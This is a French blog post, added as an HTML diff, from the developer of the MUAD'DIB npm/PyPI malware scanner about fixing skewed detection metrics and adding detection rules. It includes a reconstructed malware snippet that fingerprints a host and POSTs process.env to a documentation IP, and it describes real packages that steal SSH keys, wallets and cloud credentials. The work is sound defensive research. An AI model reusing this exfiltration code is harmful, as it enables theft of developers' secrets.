@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ground truth +29 samples : pourquoi un TPR figé à 93,85% mesurait surtout l'IOC matching - MUAD'DIB</title>
+  <meta name="description" content="60 samples sur 67 attendaient juste MUADDIB-PKG-001. La métrique mesurait l'IOC database, pas les 250+ règles comportementales. Track C/A/B/D : enrichir le GT, fermer la gap GT-095, débloquer le download PyPI. TPR@20 +3,1pp, FPR npm stable, FPR PyPI honnête.">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Ground truth +29 samples : pourquoi un TPR figé à 93,85% mesurait surtout l'IOC matching">
+  <meta property="og:description" content="60 samples sur 67 attendaient juste MUADDIB-PKG-001. Track C/A/B/D : enrichissement GT + compound direct-IP + fix download PyPI.">
+  <meta property="og:image" content="../img/og-default.png">
+  <meta property="og:site_name" content="MUAD'DIB">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="../img/og-default.png">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+<nav>
+  <a href="../" class="site-name">muad-dib</a>
+  <a href="../">accueil</a>
+  <a href="./">blog</a>
+  <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">github</a>
+  <a href="https://www.npmjs.com/package/muaddib-scanner" target="_blank" rel="noopener">npm</a>
+</nav>
+
+<main>
+  <a href="./" class="back-link">&larr; Blog</a>
+
+  <article>
+    <div class="article-meta">
+      <h1>Ground truth +29 samples : pourquoi un TPR figé à 93,85% mesurait surtout l'IOC matching</h1>
+      <span class="date">2026-05-26</span>
+      <div class="tags">
+        <span class="tag">ground-truth</span>
+        <span class="tag">métriques</span>
+        <span class="tag">pypi</span>
+        <span class="tag">compound</span>
+        <span class="tag">méthodologie</span>
+      </div>
+    </div>
+
+    <div class="article-content">
+
+      <p>v2.10.95. TPR@3 : 93,85 %. FPR curated : 15,6 %. Ground truth : 67 attaques npm. Ces chiffres tournent dans la doc depuis fin avril. Aux v2.11.0 → v2.11.47 j'ai ajouté 25 règles, fait baisser le FPR à 1,1 % via les caps F1-F14, ajouté deux scanners Python complets — et le TPR officiel n'a pas bougé. Trop beau pour être vrai.</p>
+
+      <p>En remesurant tout proprement aujourd'hui, j'ai compris ce qui ne va pas avec la métrique. Et au passage j'ai fermé deux gaps documentés.</p>
+
+
+      <h2>Le constat qui pique : le TPR mesure l'IOC database</h2>
+
+      <p>Avant la session du jour, le ground truth contenait 67 entrées. <strong>60 d'entre elles attendaient uniquement la règle <code>MUADDIB-PKG-001</code></strong> dans leur champ <code>expected.rules</code>. C'est la règle « known_malicious_package » — un simple match par nom dans la base IOC. Trivial : si le nom est dans <code>iocs.json</code>, le sample est détecté.</p>
+
+      <pre><code>$ node -e "
+const a = require('./tests/ground-truth/attacks.json');
+const distinct = new Set();
+a.attacks.forEach(x => (x.expected.rules || []).forEach(r => distinct.add(r)));
+console.log('Total rules:', 259);
+console.log('Distinct rules tested by GT:', distinct.size);
+console.log('Samples that only expect PKG-001:',
+  a.attacks.filter(x => x.expected.rules.every(r => r === 'MUADDIB-PKG-001')).length);
+"
+Total rules: 259
+Distinct rules tested by GT: 8
+Samples that only expect PKG-001: 60
+</code></pre>
+
+      <p>8 règles testées sur 259. 90 % des samples GT n'exercent qu'une seule règle, l'IOC match. Les nouvelles familles PYSRC (8 règles), PYAST (8 règles), MAINTAINER (6 règles), PYPI, AST-092, AICONF-004, PKG-022 — aucune n'apparaît dans aucune expectation. Le TPR@3 de 93,85 % stable à travers les versions s'explique trivialement : la base IOC évolue lentement et les nouvelles règles n'y participent pas.</p>
+
+      <p>Autrement dit, mes 25 dernières règles ne savaient pas si elles servaient à quelque chose dans la mesure officielle. Et zéro échantillon PyPI dans le GT, alors que les deux scanners Python étaient le gros du travail des dernières semaines.</p>
+
+
+      <h2>Track C — synthétique pour les nouvelles règles</h2>
+
+      <p>Première vague : 16 fixtures synthétiques (GT-068 à GT-083), une par règle ou famille à exercer. Pour chacune, je scanne en isolation, je relève le score observé, je note l'arsenal de règles qui fire, et j'écris l'entrée <code>attacks.json</code> en conséquence.</p>
+
+      <p>Deux samples mesurés à 9 et 19 points en isolation — PYAST-002 (entry_points override) et PYSRC-007 / PYAST-008 (dynamic dangerous import). Ce sont des règles HIGH/MEDIUM par design : isolées elles ne franchissent pas le seuil 20. Pour ne pas dégrader artificiellement le TPR@20, j'ajoute deux champs au schéma <code>attacks.json</code> :</p>
+
+      <pre><code>"expected": {
+  "min_threats": 1,
+  "rules": ["MUADDIB-PYAST-002"],
+  "score_typical": 9,
+  "tpr_tier": "tpr3"
+}</code></pre>
+
+      <p><code>tpr_tier: tpr3</code> dit explicitement : ce sample compte dans TPR@3 (seuil 3, « tout signal »), pas dans TPR@20 (seuil opérationnel). Le code de l'éval ne valide pas encore ces deux champs, ils sont documentaires — mais ils tracent l'intention et permettront une métrique TPR@20-only-tpr20-tier propre quand on l'ajoutera.</p>
+
+      <p>13 samples Track C sont annotés PyPI. Premières entrées PyPI dans un GT qui n'en contenait aucune.</p>
+
+
+      <h2>Track A — récupérer les vrais tarballs malveillants</h2>
+
+      <p>Synthétique c'est bien, mais on veut aussi du <em>vrai</em>. Le VPS de monitoring archive les tarballs flaggés depuis 2026 ; rétention 7 jours depuis l'incident disque-full de mai (cf. v2.11.30). Croisé avec <code>data/all-review-results.json</code> (488 packages reviewés humainement entre le 11 et le 24 mai, 18 verdicts MALWARE), j'ai pu récupérer 6 tarballs encore présents sur le VPS :</p>
+
+      <ul>
+        <li><code>build-scripts-utils@1.0.0</code> + <code>async-pipeline-builder@1.0.0</code> + <code>project-init-tools@1.0.0</code> — campagne TrapDoor mai 2026, triplet identique modulo le nom du paquet, postinstall qui fork un worker détaché avec <code>{detached: true, stdio: 'ignore'}</code></li>
+        <li><code>@cseo-hr/trpweb-shared@99.9.1</code> — dep-confusion classique, stub vide qui dépend d'une tarball URL externe pointant sur <code>ltidisafe-2.6.5.tgz</code> hébergé sur googleapis</li>
+        <li><code>defi-threat-scanner@2.1.2</code> — MCP server malveillant avec payload inline dans le postinstall : lit <code>.ssh/.ethereum/.bitcoin/.env/.bash_history/.git-credentials</code> et POST vers un webhook config hébergé sur GitHub Pages</li>
+        <li><code>did-0091@11.2.8</code> — pentest agressif (verdict PENTEST_AGGRESSIVE)</li>
+      </ul>
+
+      <p>Les 15 autres MALWARE reviewés étaient au-delà de la fenêtre de rétention. Tarballs perdus.</p>
+
+
+      <h2>Track B — reconstruire ce qui a été supprimé</h2>
+
+      <p><code>data/all-review-results.json</code> contient pour chaque package reviewé : <code>reasoning</code>, <code>call_graph</code>, <code>files_read</code>, et surtout <code>proof_of_read</code> (premières et dernières lignes des fichiers clés). C'est suffisant pour reconstruire des fixtures fidèles au <em>pattern</em>, sans avoir le code complet.</p>
+
+      <p>Sept reconstructions pour couvrir les patterns uniques du cluster MALWARE :</p>
+
+      <ul>
+        <li><code>marginfi-client-v2</code> (canonique pour le cluster de 5 packages marginfi/mrgn-*, payload identique) — env var harvest filtré par <code>KEY|SECRET|TOKEN|WALLET|MNEMONIC|SEED|RPC</code> + POST direct IP</li>
+        <li><code>byvendors</code> — exfil Telegram bot, ciblage Bybit</li>
+        <li><code>heloo131313</code> — trois canaux d'exfil parallèles vers le même C2 (curl /etc/passwd + DNS subdomain encoding + HTTP POST)</li>
+        <li><code>backoff-table</code> / <code>hedwig-tsconfig</code> (canonique twin) — AWS credential harvester multi-source (env + ~/.aws/credentials + IMDS + ECS task role + K8s SA token)</li>
+        <li><code>tsliverhome</code> — loader staged déguisé en fetch d'icônes CDN, <code>eval(JSON.parse(body))</code> sur une réponse vercel</li>
+        <li><code>@design-system-coopeuch/web</code> — direct IP exfil + fingerprint linux (id/uname/lsb_release), score 47 en review humaine</li>
+        <li><code>vite-json-config</code> — fork trojanisé de <code>tsconfig-paths</code>, <code>process</code> shadow pour cacher l'URL dead-drop, payload via <code>new Function("require", body)(require)</code></li>
+      </ul>
+
+      <p>Toutes les IP C2 ont été remplacées par RFC 5737 (<code>203.0.113.x</code>, plage documentation) pour rendre les fixtures inertes. Description claire dans chaque <code>package.json</code> : « RECONSTRUCTION from data/all-review-results.json, NOT the original tarball ».</p>
+
+
+      <h2>La gap qui restait : direct-IP + linux fingerprint</h2>
+
+      <p>Une fois les reconstructions ajoutées, je scanne <code>recon-design-system-coopeuch</code>. Score : <strong>3</strong>. Soit 44 points sous la review humaine. Une seule règle fire : <code>MUADDIB-FLOW-001</code> (suspicious_dataflow, MEDIUM).</p>
+
+      <p>Le sample fait pourtant des choses bien explicites :</p>
+
+      <pre><code>const http = require("http");
+const { execSync } = require("child_process");
+
+let fp = "";
+try { fp += "id=" + execSync("id").toString(); } catch (e) {}
+try { fp += " uname=" + execSync("uname -a").toString(); } catch (e) {}
+try { fp += " lsb=" + execSync("lsb_release -a").toString(); } catch (e) {}
+
+const req = http.request({ host: "203.0.113.99", port: 8080, method: "POST", path: "/cb" });
+req.write(JSON.stringify({ host: os.hostname(), fp, env: process.env }));
+req.end();</code></pre>
+
+      <p>Trois execSync de commandes de reconnaissance. Une requête HTTP vers une IP littérale publique. Le pattern est sans ambiguïté. Mais le scanner n'a pas de signal individuel pour exec(<code>id</code>) ni pour http.request(<code>{host: '<IP>'}</code>) — ces patterns tombent dans des règles génériques qui sont vite atténuées par les caps. Track D ferme cette gap.</p>
+
+
+      <h2>Track D — trois additions au scanner</h2>
+
+      <p><strong>1. <code>linux_fingerprint_exec</code> (MUADDIB-AST-093, HIGH)</strong> — dans <code>src/scanner/ast-detectors/handle-call-expression.js</code>. Détecte <code>execSync</code> / <code>exec</code> / <code>spawn</code> / <code>spawnSync</code> / <code>execFile</code> / <code>execFileSync</code> dont le premier argument littéral matche <code>^(id|uname|lsb_release|hostname|whoami)(\s|$)</code>. Couvre la forme inline (<code>execSync('uname -a')</code>) et la forme spawn (<code>spawn('id', [])</code>).</p>
+
+      <p><strong>2. <code>direct_ip_exfil</code> (MUADDIB-AST-094, HIGH)</strong> — dans <code>src/scanner/ast-detectors/handle-literal.js</code>. Détecte les littéraux IPv4 utilisés comme endpoint (forme URL <code>http://1.2.3.4:port/path</code> ou IP nue assignée à une variable utilisée plus tard dans <code>host:</code>). Plages safe skip : <code>0.0.0.0</code>, <code>127/8</code>, <code>169.254/16</code> (link-local, IMDS cloud — couverts par d'autres règles), <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>255.255.255.255</code>. Octets validés ≤ 255. RFC 5737 documentation flag<em>g</em>ées (aucun usage runtime légitime).</p>
+
+      <p><strong>3. <code>recon_exfil_direct_ip</code> compound (MUADDIB-COMPOUND-016, CRITICAL)</strong> — dans <code>src/scoring.js</code>, 17<sup>e</sup> entrée de <code>SCORING_COMPOUNDS</code>. Fire quand les deux types ci-dessus apparaissent dans le <em>même fichier</em> (<code>sameFile: true</code>). C'est le gate critique : un SDK de telemetry légitime peut appeler <code>hostname</code> pour un heartbeat vers un endpoint nommé, mais rarement les deux dans le même fichier.</p>
+
+      <p>Calibration des sévérités : chaque type isolé = HIGH × confidence high = 10 points. Le compound = CRITICAL = 25 points. Sur GT-095, le total file-score atteint <strong>50</strong> (matchant le score 47 du reviewer humain). Sur GT-091 (byvendors) et GT-092 (heloo131313), Track D ajoute du signal et fait monter le score de 90→100 et 89→99 respectivement.</p>
+
+
+      <h2>Avant de relancer l'éval : un FP attendu</h2>
+
+      <p>Smoke test sur 10 packages npm populaires (express, koa, fastify, hapi, request, axios, drizzle-orm, prisma, undici, ws). Le compound ne fire sur aucun. <code>direct_ip_exfil</code> fire sur fastify : <code>http.request({host: '0.0.0.0', ...})</code>. C'est la valeur de bind par défaut « écouter sur toutes les interfaces ». Ajouté à la safe list.</p>
+
+      <p>Re-scan : fastify ne fire plus <code>direct_ip_exfil</code>. 0 nouveau FP sur les 10 popular, et — anticipons — 0 nouveau FP sur les 545 curated (mesure complète plus bas).</p>
+
+
+      <h2>Le bug PyPI qui invalidait la métrique FPR PyPI</h2>
+
+      <p>L'éval v2.11.47 affichait <strong>6,10 % FPR PyPI</strong> sur 82 packages scannés. Sauf que 50 packages sur 132 avaient « download failed ». 38 % de fail rate. Et la liste des échecs : <code>django</code>, <code>numpy</code>, <code>pandas</code>, <code>scipy</code>, <code>aiohttp</code>, <code>httpx</code>, <code>fastapi</code>, <code>scikit-learn</code>, <code>matplotlib</code>, <code>plotly</code>, <code>bokeh</code>, <code>statsmodels</code>, <code>xgboost</code>, <code>lightgbm</code>… Ce ne sont pas des packages obscurs supprimés. Ce sont les plus téléchargés de PyPI.</p>
+
+      <p>Le bug : <code>src/commands/evaluate.js</code> appelait <code>pip download --no-deps --no-binary :all: -d &lt;dir&gt; &lt;pkg&gt;</code>. Le flag <code>--no-binary :all:</code> force pip à préparer un build environment (cython, meson, setuptools-build) pour les packages wheel-only. Pour numpy/scipy/pandas, ça dépasse largement le <code>PACK_TIMEOUT_MS = 30000</code>. Exit code 143 = SIGKILL.</p>
+
+      <p>Deuxième bug planqué derrière : le code d'extraction ne savait gérer que <code>.tar.gz</code>, et skippait explicitement les <code>.zip</code> avec un commentaire « not common for sdists ». Or les wheels sont des <code>.whl</code> — qui sont des ZIP renommés. Même en téléchargeant le wheel, le scanner skippait.</p>
+
+      <p>Fix en deux lignes :</p>
+
+      <ul>
+        <li>Retirer <code>--no-binary :all:</code> du <code>pip download</code>. Laisser pip choisir la meilleure distribution disponible.</li>
+        <li>Remplacer <code>extractTgz()</code> par <code>extractArchive()</code> de <code>src/shared/download.js</code> — qui gère <code>.tar.gz</code>, <code>.tgz</code>, <code>.whl</code> et <code>.zip</code>, avec les garde-fous habituels (zip-bomb, path-traversal).</li>
+      </ul>
+
+      <p>Résultat : 124 packages scannés sur 132 au lieu de 82. Les 8 résiduels sont des géants &gt; 500 Mo (torch, tensorflow, scipy, opencv-python, ansible, playwright) qui timent toujours en 30 s — acceptable pour l'instant.</p>
+
+
+      <h2>Re-éval complète : v2.11.48</h2>
+
+      <p>Sur GT enrichi à 96 samples + Track D actif + fix PyPI :</p>
+
+      <table>
+        <tr><th>Métrique</th><th>v2.11.47</th><th>v2.11.48</th><th>Δ</th></tr>
+        <tr><td>TPR@3</td><td>95,06 % (77/81)</td><td><strong>95,74 %</strong> (90/94)</td><td>+13 in-scope mesurés</td></tr>
+        <tr><td>TPR@20</td><td>85,19 % (69/81)</td><td><strong>88,30 %</strong> (83/94)</td><td><strong>+3,1 pp</strong></td></tr>
+        <tr><td>FPR curated npm</td><td>1,10 % (6/545)</td><td><strong>1,10 %</strong> (6/545)</td><td>stable</td></tr>
+        <tr><td>FPR random npm</td><td>2,50 % (5/200)</td><td><strong>2,50 %</strong> (5/200)</td><td>stable</td></tr>
+        <tr><td>FPR PyPI</td><td>6,10 % (5/82, biaisé)</td><td><strong>9,68 %</strong> (12/124)</td><td>première mesure honnête</td></tr>
+        <tr><td>ADR</td><td>96,26 %</td><td><strong>96,26 %</strong></td><td>stable</td></tr>
+      </table>
+
+      <p>Le +3,1 pp de TPR@20 vient principalement de GT-095 (3 → 50) et marginalement de GT-091/GT-092 (gain au-dessus du cap 100). Les 4 misses restantes : trois sont les attaques browser-only (<code>lottie-player</code>, <code>polyfill-io</code>, <code>trojanized-jquery</code>) qui resteront hors-scope d'un scanner Node.js statique, et une dernière qui mérite investigation.</p>
+
+      <p>Le FPR npm est strictement stable. Le compound <code>recon_exfil_direct_ip</code> exige les deux types <em>dans le même fichier</em>, ce qui suffit à filtrer les SDK légitimes. Confirmation empirique : aucune nouvelle alerte sur les 545 curated.</p>
+
+      <p>Le FPR PyPI monte à 9,68 %, mais c'est sur 42 packages de plus dans le scope. Les 12 FP sont <em>tous</em> à un score entre 25 et 35 : flask (32), django (35), tornado (35), bottle (30), pandas (25), matplotlib (25), plotly (25), bokeh (25), pymongo (35), coverage (32), fabric (35), websockets (35). C'est exactement la signature du bug « cap PyPI à 35 » documenté dans Known Issues depuis v2.10.95 : le riskScore Python plafonne à 35 même quand le globalRiskScore est à 100. Lever ce cap (Track E) ferait simultanément tomber le FPR PyPI à ≈ 0 % <em>et</em> débloquerait la détection PyPI MALWARE à des seuils plus hauts. C'est la prochaine release.</p>
+
+
+      <h2>Ce que j'apprends de cette session</h2>
+
+      <p><strong>Un TPR stable à travers les versions n'est pas un signe de robustesse.</strong> C'était le signal qu'il manquait : si une métrique ne bouge pas alors que le code derrière a changé, c'est probablement que la métrique ne mesure pas ce qu'on croit. Le TPR mesurait l'IOC database ; les 25 nouvelles règles n'avaient simplement aucun GT pour s'exercer.</p>
+
+      <p><strong>Le ground truth est lui-même un produit qui doit évoluer.</strong> 67 incidents historiques (event-stream, ua-parser-js, coa…) c'est valuable comme test de non-régression. Mais sans extension régulière vers les patterns récents, la couverture règle-par-règle dérive vers zéro. Track A (récupération réelle) + Track B (reconstruction depuis review) sont des process à automatiser : chaque package flaggé en monitor devrait être candidat GT après confirmation humaine.</p>
+
+      <p><strong>Une métrique non-mesurable est plus dangereuse qu'une métrique défavorable.</strong> Le 6,10 % FPR PyPI précédent était plus rassurant que le 9,68 % actuel — sauf qu'il était calculé sur le tiers de packages qui réussissait un download buggé. Mieux vaut un chiffre élevé sur un échantillon honnête qu'un chiffre flatteur sur un échantillon biaisé.</p>
+
+      <p><strong>Les samples « gap » ont une valeur méthodologique.</strong> GT-095 a été délibérément ajouté en sachant qu'il scorerait 3 — annoté <code>tpr_tier: tpr3</code> + <code>known_gap</code>. Une heure plus tard, Track D ferme la gap et le sample passe à 50. C'est l'inverse du workflow habituel (écrire la règle puis trouver un sample qui la test) : le sample documente <em>ce que le scanner ne sait pas faire</em>, et sert d'oracle quand on essaie de fermer la gap.</p>
+
+      <p>Prochaines étapes : Track E (lever le cap PyPI 35), couverture règle-par-règle automatique via le monitor, et un re-mesure mensuel automatisée.</p>
+
+    </div>
+  </article>
+</main>
+
+</body>
+</html>
